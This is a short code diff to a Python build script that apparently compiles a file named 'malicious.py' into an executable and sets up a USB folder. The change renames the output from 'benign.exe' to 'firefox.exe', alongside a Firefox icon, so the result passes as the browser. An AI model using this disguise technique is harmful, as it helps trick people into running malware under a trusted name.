@@ -3,7 +3,7 @@ import shutil
 import os
 
 filename = "malicious.py"
-exename = "benign.exe"
+exename = "firefox.exe"
 icon = "Firefox.ico"
 pwd = os.getcwd()
 usbdir = os.path.join(pwd,"USB")
@@ -26,4 +26,5 @@ shutil.move(os.path.join(pwd,"dist",exename),pwd)
 shutil.rmtree("dist")
 shutil.rmtree("build")
 shutil.rmtree("__pycache__")
+
 os.remove(exename+".spec")
